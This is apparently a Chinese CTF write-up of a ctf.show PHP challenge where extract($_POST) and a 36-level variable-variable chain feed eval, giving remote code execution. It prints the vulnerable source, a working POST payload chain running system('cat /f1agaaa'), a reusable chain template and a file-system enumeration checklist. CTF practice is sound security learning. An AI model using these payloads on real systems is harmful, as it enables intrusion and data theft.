【CTF-Show 变量的变量eval】平台：ctf.show（challenge 动态靶机）｜难度：☆☆☆｜日期：2026-08-01

## 考点
`extract($_POST)` 变量覆盖 + `$$...$_` 变量链（变量变量）+ eval RCE

## 源码
```php
<?php
error_reporting(0);
extract($_POST);                              // POST参数 → 自动变成变量
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);   // 36层"变量的变量"
highlight_file(__FILE__);                     // eval之后才输出源码！
?>
```

## 核心概念
### 1. extract($_POST) = 拆包
- POST `name=hack` → 自动生成变量 `$name = "hack"`
- 键名键值都是用户控制 = 能凭空创建/覆盖任意变量（变量覆盖漏洞）

### 2. $$...$_ = 变量的变量（链式查找）
- `$$x`：先取 `$x` 的值（是另一个变量名），再取那个变量的值
- 每多一个 `$` 就多查一层；`_` 只是链条起点的变量名（可换成任何名字）
- 链：`_` → "a" → $a → "b" → $b → ... → 最后一层的值 = 代码

### 3. 两者关系
- `extract` = 建链（把 POST 参数摆成变量）
- `eval($$...$_)` = 走链（沿着变量名一层层查到底）
- 分开都无害，连起来 = RCE

## 解题过程
```python
# 工具：my_learning/web/php_eval_chain.py（通用模板，自动生成链）
# ① 扫描正确层数（用 echo 'EVALOK'; 标记验证）
python php_eval_chain.py <host> 0 "echo 'EVALOK';" scan
# → 深度 = 36

# ② 打真 payload
python php_eval_chain.py <host> 36 "system('ls');"      # 当前目录只有 index.php
python php_eval_chain.py <host> 36 "system('ls /');"    # 根目录发现 /f1agaaa
python php_eval_chain.py <host> 36 "system('cat /f1agaaa');"  # flag!
```

生成的 POST 链（36 层）：
```
_=a&a=b&b=c&...&z=a1&a1=a2&...&a9=a10&a10=system('cat /f1agaaa');
```

flag：`ctfshow{092ebb97-29d5-4874-ab99-efb49c19d067}`

## 模板规律（可直接套用）
> N 个 `$` = N 层查找 = 需要 N 个变量（含 `_`）排成链，最后一个变量 = 代码

```
POST: _=v1 & v1=v2 & v2=v3 & ... & v(N-1)=代码
       └链起点┘  └─ 中间接力 ─┘   └── 终点=payload ──┘
```

## 踩过的坑
1. **数 `$` 会数错**（数成 37/38，实际 36）→ 别数，用脚本扫深度
2. **eval 输出在源码前面**：本源码 highlight_file 在 eval 之后 → 找输出要去 `<code>` 之前（上题反过来，先看代码顺序！）
3. `error_reporting(0)`：失败静默 → 先用 `echo 'EVALOK';` 标记验证链通没通

## 找 flag 方法论（每道 RCE 题通用）
```
① system('ls')      当前目录
② system('ls /')    根目录
③ system('env')     环境变量（可能有诱饵 FLAG=not_flag）
④ find / -name '*flag*' 2>/dev/null   全盘搜
⑤ 常见位置：/flag /flag.txt /root/flag /f1agaaa(l33t伪装)
```

## 相关对比
| | 嵌套eval题 | 变量的变量题 |
|---|---|---|
| 链形式 | cookie→POST→GET→REQUEST | 36层变量接力 |
| 工具 | ctfshow_nested_eval.py | php_eval_chain.py |
| 共同心法 | 拆链 → 逐站喂值 → EVALOK验证 → 真payload |
